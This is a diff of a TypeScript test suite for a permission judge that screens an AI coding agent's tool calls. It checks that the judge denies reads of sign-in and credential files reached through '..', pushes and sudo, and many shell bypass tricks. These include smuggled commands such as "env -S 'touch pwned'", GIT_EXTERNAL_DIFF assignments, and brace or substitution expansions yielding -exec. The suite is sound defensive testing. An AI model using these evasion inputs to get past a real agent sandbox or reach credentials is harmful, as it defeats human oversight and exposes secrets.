+    ]) {
+      expect.soft(run(command), JSON.stringify(command)).toEqual({ decision: 'allow' });
+    }
   });
 
-  it.each([
-    ['>x git push --force', 'Lanes never push; 10db pushes the work when it ships.'],
-    ['>x sudo ls', 'sudo is never allowed.'],
-  ])('judges %s as the command after the redirection', (command, reason) => {
-    expect(run(command)).toEqual({ decision: 'deny', reason });
+  it('judges the command after a leading redirection', () => {
+    const rows: [string, string][] = [
+      ['>x git push --force', 'Lanes never push; 10db pushes the work when it ships.'],
+      ['>x sudo ls', 'sudo is never allowed.'],
+    ];
+    for (const [command, reason] of rows) {
+      expect.soft(run(command), command).toEqual({ decision: 'deny', reason });
+    }
   });
 });
 
@@ -1488,37 +1556,36 @@ describe('protected paths reached through a link and ..', () => {
       ownSession: { configDir: configDir(), providerSessionId: 'sess_own' },
     });
 
-  it.each<[string, string, () => unknown]>([
-    ['Read of the sign-in file', 'Read', () => ({ file_path: 'h/../.claude.json' })],
-    [
-      'Read of the data directory',
-      'Read',
-      () => ({ file_path: `${repoDir()}/s/../data/accounts/x` }),
-    ],
-    ['Glob under a base that climbs', 'Glob', () => ({ path: 'h/..', pattern: '.claude/*' })],
-    ['Grep over a root that holds the sign-in', 'Grep', () => ({ pattern: 'x', path: 'h/..' })],
-    [
-      'Read of tool results that climbs out through a link',
-      'Read',
-      () => ({ file_path: `${results()}/cfg/../.claude.json` }),
-    ],
-  ])('denies %s', (_name, tool, input) => {
-    expect(run(tool, input()).decision).toBe('deny');
+  it('denies a read whose kernel reading reaches the sign-in or the data directory', () => {
+    const rows: [string, string, unknown][] = [
+      ['Read of the sign-in file', 'Read', { file_path: 'h/../.claude.json' }],
+      ['Read of the data directory', 'Read', { file_path: `${repoDir()}/s/../data/accounts/x` }],
+      ['Glob under a base that climbs', 'Glob', { path: 'h/..', pattern: '.claude/*' }],
+      ['Grep over a root that holds the sign-in', 'Grep', { pattern: 'x', path: 'h/..' }],
+      [
+        'Read of tool results that climbs out through a link',
+        'Read',
+        { file_path: `${results()}/cfg/../.claude.json` },
+      ],
+    ];
+    for (const [name, tool, input] of rows)
+      expect.soft(run(tool, input).decision, name).toBe('deny');
+    // A glob before a .. leaves no single path to judge.
+    const unresolved: [string, string][] = [
+      ['a glob and .. through a link under home', 'h/*/../.claude.json'],
+      ['a glob and .. under a directory not made yet', 'newdir/*/../../.claude/.credentials.json'],
+      ['a glob and .. that end in a glob', 'h/*/../.cl*'],
+    ];
+    for (const [name, file_path] of unresolved) {
+      const verdict = run('Read', { file_path });
+      expect
+        .soft(verdict.decision === 'deny' ? verdict.reason : 'allowed', name)
+        .toMatch(/cannot be resolved here/);
+    }
   });
 
   it('allows a Read of README.md', () => {
     expect(run('Read', { file_path: 'README.md' })).toEqual({ decision: 'allow' });
-  });
-
-  it.each([
-    ['a glob and .. through a link under home', 'h/*/../.claude.json'],
-    ['a glob and .. under a directory not made yet', 'newdir/*/../../.claude/.credentials.json'],
-    ['a glob and .. that end in a glob', 'h/*/../.cl*'],
-  ])('refuses a Read of %s as a path it cannot resolve', (_name, file_path) => {
-    const verdict = run('Read', { file_path });
-    expect(verdict.decision === 'deny' ? verdict.reason : 'allowed').toMatch(
-      /cannot be resolved here/,
-    );
   });
 
   it('allows a Read of the session tool results', () => {
@@ -1537,11 +1604,8 @@ describe('very long paths', () => {
     expect(verdict).toEqual({ decision: 'deny', reason: overLong });
   });
 
-  it('refuses rm -r of a path with more than 1024 parts', () => {
+  it('refuses rm -r of a path with more than 1024 parts or over 4096 characters', () => {
     expect(bash(`rm -rf ${'a/'.repeat(1025)}`)).toEqual({ decision: 'deny', reason: overLong });
-  });
-
-  it('refuses rm -r of a path over 4096 characters', () => {
     expect(bash(`rm -rf ${'a'.repeat(4097)}`)).toEqual({ decision: 'deny', reason: overLong });
   });
 });
@@ -1558,66 +1622,75 @@ describe('classifyPath', () => {
 describe('classifyPath with the stock hazards', () => {
   const hazardsOf = (path: string) => classifyPath(path, [], DEFAULT_HAZARDS).hazards;
 
-  it.each([
-    'package.json',
-    'package-lock.json',
-    'npm-shrinkwrap.json',
-    'pnpm-lock.yaml',
-    'yarn.lock',
-    'bun.lock',
-    'bun.lockb',
-    'Cargo.toml',
-    'Cargo.lock',
-    'pyproject.toml',
-    'uv.lock',
-    'poetry.lock',
-    'requirements.txt',
-    'requirements-dev.txt',
-    'requirements/base.txt',
-    'Pipfile',
-    'Pipfile.lock',
-    'go.mod',
-    'go.sum',
-    'Gemfile',
-    'Gemfile.lock',
-  ])('puts %s, at the root and nested, in deps', (file) => {
-    expect(hazardsOf(file)).toEqual(['deps']);
-    expect(hazardsOf(`amps/frontend/${file}`)).toEqual(['deps']);
-    expect(hazardsOf(`a/b/c/${file}`)).toEqual(['deps']);
+  it('puts each lockfile and manifest in deps, at the root and nested', () => {
+    for (const file of [
+      'package.json',
+      'package-lock.json',
+      'npm-shrinkwrap.json',
+      'pnpm-lock.yaml',
+      'yarn.lock',
+      'bun.lock',
+      'bun.lockb',
+      'Cargo.toml',
+      'Cargo.lock',
+      'pyproject.toml',
+      'uv.lock',
+      'poetry.lock',
+      'requirements.txt',
+      'requirements-dev.txt',
+      'requirements/base.txt',
+      'Pipfile',
+      'Pipfile.lock',
+      'go.mod',
+      'go.sum',
+      'Gemfile',
+      'Gemfile.lock',
+    ]) {
+      expect.soft(hazardsOf(file), file).toEqual(['deps']);
+      expect.soft(hazardsOf(`amps/frontend/${file}`), file).toEqual(['deps']);
+      expect.soft(hazardsOf(`a/b/c/${file}`), file).toEqual(['deps']);
+    }
   });
 
-  it.each([
-    'drizzle/0001_x.sql',
-    'packages/db/drizzle/meta/_journal.json',
-    'backend/app/migrations/0001_initial.py',
-    'migrations/versions/abc_add_x.py',
-    'alembic/versions/abc_add_x.py',
-    'backend/alembic/versions/abc_add_x.py',
-    'db/migrate/20260101000000_add_x.rb',
-    'api/db/migrate/20260101000000_add_x.rb',
-    'prisma/migrations/20260101_init/migration.sql',
-    'apps/web/prisma/migrations/migration_lock.toml',
-  ])('puts %s in migrations', (file) => {
-    expect(hazardsOf(file)).toEqual(['migrations']);
+  it('puts each migration in migrations, and a look-alike in no hazard', () => {
+    for (const file of [
+      'drizzle/0001_x.sql',
+      'packages/db/drizzle/meta/_journal.json',
+      'backend/app/migrations/0001_initial.py',
+      'migrations/versions/abc_add_x.py',
+      'alembic/versions/abc_add_x.py',
+      'backend/alembic/versions/abc_add_x.py',
+      'db/migrate/20260101000000_add_x.rb',
+      'api/db/migrate/20260101000000_add_x.rb',
+      'prisma/migrations/20260101_init/migration.sql',
+      'apps/web/prisma/migrations/migration_lock.toml',
+    ]) {
+      expect.soft(hazardsOf(file), file).toEqual(['migrations']);
+    }
+    for (const file of ['requirements.md', 'src/go.ts', 'src/migrate.ts', 'docs/Gemfile.md']) {
+      expect.soft(hazardsOf(file), file).toEqual([]);
+    }
   });
-
-  it.each(['requirements.md', 'src/go.ts', 'src/migrate.ts', 'docs/Gemfile.md'])(
-    'leaves %s in no hazard',
-    (file) => {
-      expect(hazardsOf(file)).toEqual([]);
-    },
-  );
 });
 
 describe('classifyPath with dotfiles', () => {
   const REPO_AREA = [{ name: 'repo', globs: ['**'] }];
 
-  it.each(['.gitignore', '.github/workflows/ci.yml', '.claude/rules/testing.md', 'a/.b/.c/d'])(
-    'puts %s in an area whose glob is **',
-    (path) => {
-      expect(classifyPath(path, REPO_AREA, [])).toEqual({ areas: ['repo'], hazards: [] });
-    },
-  );
+  it('puts a dotfile in an area whose glob is **, and never .git', () => {
+    for (const path of [
+      '.gitignore',
+      '.github/workflows/ci.yml',
+      '.claude/rules/testing.md',
+      'a/.b/.c/d',
+    ]) {
+      expect
+        .soft(classifyPath(path, REPO_AREA, []), path)
+        .toEqual({ areas: ['repo'], hazards: [] });
+    }
+    for (const path of ['.git/config', '.git', 'sub/.git', 'a/.git/b']) {
+      expect.soft(classifyPath(path, REPO_AREA, []).areas, path).toEqual([]);
+    }
+  });
 
   it('still routes a path a stock hazard covers to that hazard', () => {
     expect(classifyPath('.claude/rules/testing.md', REPO_AREA, DEFAULT_HAZARDS)).toEqual({
@@ -1663,13 +1736,8 @@ describe('classifyPath with dotfiles', () => {
     expect(verdict.decision).toBe('allow');
   });
 
-  it.each(['.git/config', '.git', 'sub/.git', 'a/.git/b'])('keeps %s in no area', (path) => {
-    expect(classifyPath(path, REPO_AREA, []).areas).toEqual([]);
-  });
-
-  it.each(['.git/hooks/pre-commit', '.git/config'])(
-    'denies an edit of %s with the ** area claimed and no file-access judge',
-    (path) => {
+  it('denies an edit of .git with the ** area claimed and no file-access judge', () => {
+    for (const path of ['.git/hooks/pre-commit', '.git/config']) {
       const verdict = judgeToolUse({
         judge: JudgeKind.Rules,
         coveredByAllowRule: false,
@@ -1682,19 +1750,22 @@ describe('classifyPath with dotfiles', () => {
         readOnly: false,
         protectedPaths: guarded(),
       });
-      expect(verdict.decision).toBe('deny');
-    },
-  );
+      expect.soft(verdict.decision, path).toBe('deny');
+    }
+  });
 });
 
 describe('stringField', () => {
-  it.each<{ name: string; input: unknown; expected: string | null }>([
-    { name: 'a string field', input: { command: 'ls' }, expected: 'ls' },
-    { name: 'a non-string field', input: { command: 1 }, expected: null },
-    { name: 'a missing field', input: {}, expected: null },
-    { name: 'a non-object input', input: null, expected: null },
-  ])('$name', ({ input, expected }) => {
-    expect(stringField(input, 'command')).toBe(expected);
+  it('returns a string field, and null for anything else', () => {
+    const rows: { name: string; input: unknown; expected: string | null }[] = [
+      { name: 'a string field', input: { command: 'ls' }, expected: 'ls' },
+      { name: 'a non-string field', input: { command: 1 }, expected: null },
+      { name: 'a missing field', input: {}, expected: null },
+      { name: 'a non-object input', input: null, expected: null },
+    ];
+    for (const { name, input, expected } of rows) {
+      expect.soft(stringField(input, 'command'), name).toBe(expected);
+    }
   });
 });
 
@@ -1707,221 +1778,242 @@ describe('implement steps and tools outside the read-only list', () => {
 describe('read-only steps', () => {
   const ro = (tool: string, input: object) =>
     judge(tool, input, [{ kind: 'area', name: 'api' }], true);
-  it.each([
-    { tool: 'Write', input: { file_path: 'src/api/a.ts' }, decision: 'deny' },
-    { tool: 'Edit', input: { file_path: 'src/api/a.ts' }, decision: 'deny' },
-    { tool: 'MultiEdit', input: { file_path: 'src/api/a.ts' }, decision: 'deny' },
-    { tool: 'NotebookEdit', input: { notebook_path: 'src/api/n.ipynb' }, decision: 'deny' },
-    { tool: 'Read', input: { file_path: 'src/api/a.ts' }, decision: 'allow' },
-    { tool: 'Grep', input: { pattern: 'x' }, decision: 'allow' },
-    { tool: 'Skill', input: { skill: 'review-checklist' }, decision: 'allow' },
-    { tool: 'BashOutput', input: { bash_id: '1' }, decision: 'allow' },
-    { tool: 'mcp__10db__complete_step', input: {}, decision: 'allow' },
-    { tool: 'mcp__fs__write_file', input: { path: 'src/api/a.ts' }, decision: 'deny' },
-    { tool: 'mcp__mine__ping', input: {}, decision: 'deny' },
-    { tool: 'Agent', input: { prompt: 'edit it' }, decision: 'deny' },
-  ])('$decision $tool inside the claims', ({ tool, input, decision }) => {
-    expect(ro(tool, input).decision).toBe(decision);
+  it('denies every edit and unreviewed tool inside the claims, and allows the reads', () => {
+    for (const { tool, input, decision } of [
+      { tool: 'Write', input: { file_path: 'src/api/a.ts' }, decision: 'deny' },
+      { tool: 'Edit', input: { file_path: 'src/api/a.ts' }, decision: 'deny' },
+      { tool: 'MultiEdit', input: { file_path: 'src/api/a.ts' }, decision: 'deny' },
+      { tool: 'NotebookEdit', input: { notebook_path: 'src/api/n.ipynb' }, decision: 'deny' },
+      { tool: 'Read', input: { file_path: 'src/api/a.ts' }, decision: 'allow' },
+      { tool: 'Grep', input: { pattern: 'x' }, decision: 'allow' },
+      { tool: 'Skill', input: { skill: 'review-checklist' }, decision: 'allow' },
+      { tool: 'BashOutput', input: { bash_id: '1' }, decision: 'allow' },
+      { tool: 'mcp__10db__complete_step', input: {}, decision: 'allow' },
+      { tool: 'mcp__fs__write_file', input: { path: 'src/api/a.ts' }, decision: 'deny' },
+      { tool: 'mcp__mine__ping', input: {}, decision: 'deny' },
+      { tool: 'Agent', input: { prompt: 'edit it' }, decision: 'deny' },
+    ]) {
+      expect.soft(ro(tool, input).decision, tool).toBe(decision);
+    }
   });
 
-  it.each([
-    { name: 'read-only git', command: 'git diff HEAD -- src/api', decision: 'allow' },
-    { name: 'git log piped to head', command: 'git log --oneline | head -5', decision: 'allow' },
-    {
-      name: 'a grep with stderr discarded',
-      command: 'grep -rn TODO src 2>/dev/null',
-      decision: 'allow',
-    },
-    { name: 'find that only lists', command: "find src -name '*.ts'", decision: 'allow' },
-    { name: 'a redirect into a file', command: 'echo x > src/api/a.ts', decision: 'deny' },
-    { name: 'an append', command: 'cat a >> b', decision: 'deny' },
-    { name: 'sed in place', command: "sed -i 's/a/b/' src/api/a.ts", decision: 'deny' },
-    { name: 'a formatter', command: 'pnpm format', decision: 'deny' },
-    { name: 'the gate', command: 'make gate', decision: 'deny' },
-    { name: 'find -delete', command: 'find . -name x -delete', decision: 'deny' },
-    { name: 'find -exec', command: 'find . -exec rm {} ;', decision: 'deny' },
-    { name: 'tee', command: 'git diff | tee out.txt', decision: 'deny' },
-    { name: 'git push', command: 'git push origin HEAD', decision: 'deny' },
-    { name: 'git with a leading option', command: 'git -C /tmp status', decision: 'deny' },
-    {
-      name: 'sort writing a file',
-      command: 'sort -o src/api/a.ts src/api/a.ts',
-      decision: 'deny',
-    },
-    {
-      name: 'sort writing a file, long form',
-      command: 'sort --output=out.txt a.txt',
-      decision: 'deny',
-    },
-    {
-      name: 'uniq, which writes its second operand',
-      command: 'uniq a.txt b.txt',
-      decision: 'deny',
-    },
-    { name: 'tree writing a file', command: 'tree -o out.txt src', decision: 'deny' },
-    {
-      name: 'rg running a preprocessor',
-      command: 'rg --pre ./scripts/x.sh TODO',
-      decision: 'deny',
-    },
-    { name: 'cd then a read', command: 'cd src && git diff', decision: 'allow' },
-    { name: 'cd to home', command: 'cd ~', decision: 'deny' },
-    { name: 'a plain sort', command: 'sort a.txt', decision: 'allow' },
-    { name: 'a plain rg', command: 'rg -n TODO src', decision: 'allow' },
-    {
-      name: 'a read hiding a write in a substitution',
-      command: 'echo $(touch x)',
-      decision: 'deny',
-    },
-    { name: 'sort bundled flags', command: 'sort -ro src/api/a.ts other.txt', decision: 'deny' },
-    { name: 'sort -uo', command: 'sort -uo src/api/a.ts b.txt', decision: 'deny' },
-    { name: 'sort --out abbreviation', command: 'sort --out=src/api/a.ts b.txt', decision: 'deny' },
-    {
-      name: 'sort --outp abbreviation',
-      command: 'sort --outp=src/api/a.ts b.txt',
-      decision: 'deny',
-    },
-    {
-      name: 'find with a backslash in -delete',
-      command: 'find . -name x -de\\lete',
-      decision: 'deny',
-    },
-    {
-      name: 'find with a backslash in -exec',
-      command: 'find . -exe\\c rm {} \\;',
-      decision: 'deny',
-    },
-    {
-      name: 'rg abbreviated --pre with a backslash',
-      command: 'rg --pr\\e=./x.sh TODO',
-      decision: 'deny',
-    },
-    {
-      name: 'rg --hostname-bin',
-      command: 'rg --hostname-bin=./any-exe --hyperlink-format=default TODO',
-      decision: 'deny',
-    },
-    { name: 'file -C', command: 'file -C -m src/api/a.ts', decision: 'deny' },
-    { name: 'tree bundled -o', command: 'tree -ao out.txt src', decision: 'deny' },
-    { name: 'tree -R', command: 'tree -R -L 1 -H . src', decision: 'deny' },
-    {
-      name: 'sort --compress-program',
-      command: 'sort --compress-program=./x.sh -S 1k big',
-      decision: 'deny',
-    },
-    { name: 'an assignment with a redirect', command: 'X=1>src/api/a.ts', decision: 'deny' },
-    { name: 'an assignment with an append', command: 'A=b>>out.txt', decision: 'deny' },
-    { name: 'env -S', command: "env -S 'touch pwned' true", decision: 'deny' },
-    { name: 'env -P', command: 'env -P cat /usr/bin/touch pwned', decision: 'deny' },
-    { name: 'xargs -J', command: 'echo p | xargs -J cat touch cat', decision: 'deny' },
-    {
-      name: 'GIT_EXTERNAL_DIFF assignment',
-      command: "GIT_EXTERNAL_DIFF='touch pwned;true' git diff",
-      decision: 'deny',
-    },
-    {
-      name: 'git config env assignments',
-      command:
-        'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=./x git status',
-      decision: 'deny',
-    },
-    { name: 'a command run by path', command: './tools/cat x', decision: 'deny' },
-    { name: 'a wrapper such as time', command: 'time cat a', decision: 'deny' },
-    { name: 'a plain sort of a file', command: 'sort file', decision: 'allow' },
-    { name: 'sort -r', command: 'sort -r file', decision: 'allow' },
-    { name: 'rg with a path', command: 'rg TODO src', decision: 'allow' },
-    { name: 'git diff alone', command: 'git diff', decision: 'allow' },
-    { name: 'git log --oneline', command: 'git log --oneline', decision: 'allow' },
-    { name: 'find -name', command: "find . -name '*.ts'", decision: 'allow' },
-    { name: 'recursive grep', command: 'grep -rn x src', decision: 'allow' },
-    {
-      name: 'a command substitution naming -o',
-      command: "sort $(echo -o) src/api/a.ts <<< 'payload'",
-      decision: 'deny',
-    },
-    {
-      name: 'find with a substituted -exec',
-      command: "find . -maxdepth 0 $(echo -exec) sh -c 'touch pwned' ';'",
-      decision: 'deny',
-    },
-    { name: 'a backtick substitution naming -o', command: 'sort `echo -o` x b', decision: 'deny' },
-    { name: 'ANSI-C quoting of -o', command: "sort $'-o' x b", decision: 'deny' },
-    { name: 'locale quoting of -o', command: 'sort $"-o" x b', decision: 'deny' },
-    { name: 'a default expansion yielding -o', command: 'sort ${NOPE:--o} x b', decision: 'deny' },
-    { name: 'brace expansion yielding -o', command: 'sort {-o,x} b', decision: 'deny' },
-    {
-      name: 'brace expansion yielding -exec',
-      command: "find . -maxdepth 0 {-exec,sh,-c,'touch pwned2',';'}",
-      decision: 'deny',
-    },
-    {
-      name: 'brace expansion yielding -delete',
-      command: 'find . -name x {-delete,}',
-      decision: 'deny',
-    },
-    { name: 'brace expansion yielding --pre', command: 'rg {--pre=./x.sh,TODO}', decision: 'deny' },
-    {
-      name: 'a substituted git --output',
-      command: 'git diff $(echo --output=x)',
-      decision: 'deny',
-    },
-    { name: 'a redirect to a file that starts with 1', command: 'cat x 2>&1foo', decision: 'deny' },
-    {
-      name: 'a redirect to a file that starts with null',
-      command: 'echo x >/dev/nullfoo',
-      decision: 'deny',
-    },
-    { name: 'stderr merged into stdout', command: 'cat x 2>&1', decision: 'allow' },
-    { name: 'stdout discarded', command: 'grep -r x src >/dev/null', decision: 'allow' },
-    { name: 'a glob', command: 'sort *', decision: 'deny' },
-    { name: 'a home expansion', command: 'ls ~', decision: 'deny' },
-    { name: 'an =cmd expansion', command: 'cat =ls', decision: 'deny' },
-    { name: 'an =cmd expansion after empty quotes', command: 'cat ""=ls', decision: 'deny' },
-    { name: 'an =cmd expansion after an option', command: 'ls --color==ls', decision: 'deny' },
-    { name: 'an =cmd expansion after a colon', command: 'cat a=:=ls', decision: 'deny' },
-    { name: 'a comment', command: 'echo x # comment', decision: 'deny' },
-    { name: 'a newline', command: 'cat a\nb', decision: 'deny' },
-    { name: 'a variable in double quotes', command: 'cat "a$b"', decision: 'deny' },
-    { name: 'an escape in double quotes', command: 'cat "a\\"b"', decision: 'deny' },
-    { name: 'a history bang', command: 'ls !x', decision: 'deny' },
-    { name: 'an input redirect', command: 'cat <file', decision: 'deny' },
-    { name: 'a numbered redirect', command: 'cat a 3>x', decision: 'deny' },
-    { name: 'an &> redirect', command: 'cat a &>x', decision: 'deny' },
-    { name: 'a clobber redirect', command: 'cat a >|x', decision: 'deny' },
-    { name: 'a read-write redirect', command: 'cat a<>x', decision: 'deny' },
-    { name: 'backgrounding', command: 'cat a&', decision: 'deny' },
-    { name: 'a |& pipe', command: 'cat a |& cat', decision: 'deny' },
-    { name: 'an empty-quoted option prefix', command: "sort ''-o x y", decision: 'deny' },
-    { name: 'a quoted dash before o', command: 'sort "-"o x y', decision: 'deny' },
-    { name: 'a fullwidth hyphen option', command: 'sort －o x y', decision: 'deny' },
-    { name: 'a trailing separator', command: 'ls ;', decision: 'deny' },
-    { name: 'a leading separator', command: '; ls', decision: 'deny' },
-    { name: 'an unterminated quote', command: "cat 'a", decision: 'deny' },
-    { name: 'parsed: git diff', command: 'git diff', decision: 'allow' },
-    { name: 'parsed: git log with a count', command: 'git log --oneline -5', decision: 'allow' },
-    { name: 'parsed: rg', command: 'rg TODO src', decision: 'allow' },
-    {
-      name: 'parsed: grep with a paren in quotes',
-      command: "grep -rn 'foo(bar' src",
-      decision: 'allow',
-    },
-    { name: 'parsed: find with a quoted glob', command: "find . -name '*.ts'", decision: 'allow' },
-    { name: 'parsed: sort into head', command: 'sort file | head -3', decision: 'allow' },
-    { name: 'parsed: stderr merged', command: 'cat a.ts 2>&1', decision: 'allow' },
-    { name: 'parsed: stdout discarded', command: 'ls src >/dev/null', decision: 'allow' },
-    {
-      name: 'parsed: wc then git status',
-      command: 'wc -l src/a.ts && git status',
-      decision: 'allow',
-    },
-    { name: 'parsed: a command split by quotes', command: "s'o'rt file", decision: 'allow' },
-    {
-      name: 'parsed: a double-quoted pattern',
-      command: 'grep -rn "foo bar" src',
-      decision: 'allow',
-    },
-  ])('$decision $name', ({ command, decision }) => {
-    expect(ro('Bash', { command }).decision).toBe(decision);
+  it('allows only plain read-only shell words and denies any write, program or expansion', () => {
+    for (const { name, command, decision } of [
+      { name: 'read-only git', command: 'git diff HEAD -- src/api', decision: 'allow' },
+      { name: 'git log piped to head', command: 'git log --oneline | head -5', decision: 'allow' },
+      {
+        name: 'a grep with stderr discarded',
+        command: 'grep -rn TODO src 2>/dev/null',
+        decision: 'allow',
+      },
+      { name: 'find that only lists', command: "find src -name '*.ts'", decision: 'allow' },
+      { name: 'a redirect into a file', command: 'echo x > src/api/a.ts', decision: 'deny' },
+      { name: 'an append', command: 'cat a >> b', decision: 'deny' },
+      { name: 'sed in place', command: "sed -i 's/a/b/' src/api/a.ts", decision: 'deny' },
+      { name: 'a formatter', command: 'pnpm format', decision: 'deny' },
+      { name: 'the gate', command: 'make gate', decision: 'deny' },
+      { name: 'find -delete', command: 'find . -name x -delete', decision: 'deny' },
+      { name: 'find -exec', command: 'find . -exec rm {} ;', decision: 'deny' },
+      { name: 'tee', command: 'git diff | tee out.txt', decision: 'deny' },
+      { name: 'git push', command: 'git push origin HEAD', decision: 'deny' },
+      { name: 'git with a leading option', command: 'git -C /tmp status', decision: 'deny' },
+      {
+        name: 'sort writing a file',
+        command: 'sort -o src/api/a.ts src/api/a.ts',
+        decision: 'deny',
+      },
+      {
+        name: 'sort writing a file, long form',
+        command: 'sort --output=out.txt a.txt',
+        decision: 'deny',
+      },
+      {
+        name: 'uniq, which writes its second operand',
+        command: 'uniq a.txt b.txt',
+        decision: 'deny',
+      },
+      { name: 'tree writing a file', command: 'tree -o out.txt src', decision: 'deny' },
+      {
+        name: 'rg running a preprocessor',
+        command: 'rg --pre ./scripts/x.sh TODO',
+        decision: 'deny',
+      },
+      { name: 'cd then a read', command: 'cd src && git diff', decision: 'allow' },
+      { name: 'cd to home', command: 'cd ~', decision: 'deny' },
+      { name: 'a plain sort', command: 'sort a.txt', decision: 'allow' },
+      { name: 'a plain rg', command: 'rg -n TODO src', decision: 'allow' },
+      {
+        name: 'a read hiding a write in a substitution',
+        command: 'echo $(touch x)',
+        decision: 'deny',
+      },
+      { name: 'sort bundled flags', command: 'sort -ro src/api/a.ts other.txt', decision: 'deny' },
+      { name: 'sort -uo', command: 'sort -uo src/api/a.ts b.txt', decision: 'deny' },
+      {
+        name: 'sort --out abbreviation',
+        command: 'sort --out=src/api/a.ts b.txt',
+        decision: 'deny',
+      },
+      {
+        name: 'sort --outp abbreviation',
+        command: 'sort --outp=src/api/a.ts b.txt',
+        decision: 'deny',
+      },
+      {
+        name: 'find with a backslash in -delete',
+        command: 'find . -name x -de\\lete',
+        decision: 'deny',
+      },
+      {
+        name: 'find with a backslash in -exec',
+        command: 'find . -exe\\c rm {} \\;',
+        decision: 'deny',
+      },
+      {
+        name: 'rg abbreviated --pre with a backslash',
+        command: 'rg --pr\\e=./x.sh TODO',
+        decision: 'deny',
+      },
+      {
+        name: 'rg --hostname-bin',
+        command: 'rg --hostname-bin=./any-exe --hyperlink-format=default TODO',
+        decision: 'deny',
+      },
+      { name: 'file -C', command: 'file -C -m src/api/a.ts', decision: 'deny' },
+      { name: 'tree bundled -o', command: 'tree -ao out.txt src', decision: 'deny' },
+      { name: 'tree -R', command: 'tree -R -L 1 -H . src', decision: 'deny' },
+      {
+        name: 'sort --compress-program',
+        command: 'sort --compress-program=./x.sh -S 1k big',
+        decision: 'deny',
+      },
+      { name: 'an assignment with a redirect', command: 'X=1>src/api/a.ts', decision: 'deny' },
+      { name: 'an assignment with an append', command: 'A=b>>out.txt', decision: 'deny' },
+      { name: 'env -S', command: "env -S 'touch pwned' true", decision: 'deny' },
+      { name: 'env -P', command: 'env -P cat /usr/bin/touch pwned', decision: 'deny' },
+      { name: 'xargs -J', command: 'echo p | xargs -J cat touch cat', decision: 'deny' },
+      {
+        name: 'GIT_EXTERNAL_DIFF assignment',
+        command: "GIT_EXTERNAL_DIFF='touch pwned;true' git diff",
+        decision: 'deny',
+      },
+      {
+        name: 'git config env assignments',
+        command:
+          'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=./x git status',
+        decision: 'deny',
+      },
+      { name: 'a command run by path', command: './tools/cat x', decision: 'deny' },
+      { name: 'a wrapper such as time', command: 'time cat a', decision: 'deny' },
+      { name: 'a plain sort of a file', command: 'sort file', decision: 'allow' },
+      { name: 'sort -r', command: 'sort -r file', decision: 'allow' },
+      { name: 'rg with a path', command: 'rg TODO src', decision: 'allow' },
+      { name: 'git diff alone', command: 'git diff', decision: 'allow' },
+      { name: 'git log --oneline', command: 'git log --oneline', decision: 'allow' },
+      { name: 'find -name', command: "find . -name '*.ts'", decision: 'allow' },
+      { name: 'recursive grep', command: 'grep -rn x src', decision: 'allow' },
+      {
+        name: 'a command substitution naming -o',
+        command: "sort $(echo -o) src/api/a.ts <<< 'payload'",
+        decision: 'deny',
+      },
+      {
+        name: 'find with a substituted -exec',
+        command: "find . -maxdepth 0 $(echo -exec) sh -c 'touch pwned' ';'",
+        decision: 'deny',
+      },
+      {
+        name: 'a backtick substitution naming -o',
+        command: 'sort `echo -o` x b',
+        decision: 'deny',
+      },
+      { name: 'ANSI-C quoting of -o', command: "sort $'-o' x b", decision: 'deny' },
+      { name: 'locale quoting of -o', command: 'sort $"-o" x b', decision: 'deny' },
+      {
+        name: 'a default expansion yielding -o',
+        command: 'sort ${NOPE:--o} x b',
+        decision: 'deny',
+      },
+      { name: 'brace expansion yielding -o', command: 'sort {-o,x} b', decision: 'deny' },
+      {
+        name: 'brace expansion yielding -exec',
+        command: "find . -maxdepth 0 {-exec,sh,-c,'touch pwned2',';'}",
+        decision: 'deny',
+      },
+      {
+        name: 'brace expansion yielding -delete',
+        command: 'find . -name x {-delete,}',
+        decision: 'deny',
+      },
+      {
+        name: 'brace expansion yielding --pre',
+        command: 'rg {--pre=./x.sh,TODO}',
+        decision: 'deny',
+      },
+      {
+        name: 'a substituted git --output',
+        command: 'git diff $(echo --output=x)',
+        decision: 'deny',
+      },
+      {
+        name: 'a redirect to a file that starts with 1',
+        command: 'cat x 2>&1foo',
+        decision: 'deny',
+      },
+      {
+        name: 'a redirect to a file that starts with null',
+        command: 'echo x >/dev/nullfoo',
+        decision: 'deny',
+      },
+      { name: 'stderr merged into stdout', command: 'cat x 2>&1', decision: 'allow' },
+      { name: 'stdout discarded', command: 'grep -r x src >/dev/null', decision: 'allow' },
+      { name: 'a glob', command: 'sort *', decision: 'deny' },
+      { name: 'a home expansion', command: 'ls ~', decision: 'deny' },
+      { name: 'an =cmd expansion', command: 'cat =ls', decision: 'deny' },
+      { name: 'an =cmd expansion after empty quotes', command: 'cat ""=ls', decision: 'deny' },
+      { name: 'an =cmd expansion after an option', command: 'ls --color==ls', decision: 'deny' },
+      { name: 'an =cmd expansion after a colon', command: 'cat a=:=ls', decision: 'deny' },
+      { name: 'a comment', command: 'echo x # comment', decision: 'deny' },
+      { name: 'a newline', command: 'cat a\nb', decision: 'deny' },
+      { name: 'a variable in double quotes', command: 'cat "a$b"', decision: 'deny' },
+      { name: 'an escape in double quotes', command: 'cat "a\\"b"', decision: 'deny' },
+      { name: 'a history bang', command: 'ls !x', decision: 'deny' },
+      { name: 'an input redirect', command: 'cat <file', decision: 'deny' },
+      { name: 'a numbered redirect', command: 'cat a 3>x', decision: 'deny' },
+      { name: 'an &> redirect', command: 'cat a &>x', decision: 'deny' },
+      { name: 'a clobber redirect', command: 'cat a >|x', decision: 'deny' },
+      { name: 'a read-write redirect', command: 'cat a<>x', decision: 'deny' },
+      { name: 'backgrounding', command: 'cat a&', decision: 'deny' },
+      { name: 'a |& pipe', command: 'cat a |& cat', decision: 'deny' },
+      { name: 'an empty-quoted option prefix', command: "sort ''-o x y", decision: 'deny' },
+      { name: 'a quoted dash before o', command: 'sort "-"o x y', decision: 'deny' },
+      { name: 'a fullwidth hyphen option', command: 'sort －o x y', decision: 'deny' },
+      { name: 'a trailing separator', command: 'ls ;', decision: 'deny' },
+      { name: 'a leading separator', command: '; ls', decision: 'deny' },
+      { name: 'an unterminated quote', command: "cat 'a", decision: 'deny' },
+      { name: 'parsed: git log with a count', command: 'git log --oneline -5', decision: 'allow' },
+      {
+        name: 'parsed: grep with a paren in quotes',
+        command: "grep -rn 'foo(bar' src",
+        decision: 'allow',
+      },
+      { name: 'parsed: sort into head', command: 'sort file | head -3', decision: 'allow' },
+      { name: 'parsed: stderr merged', command: 'cat a.ts 2>&1', decision: 'allow' },
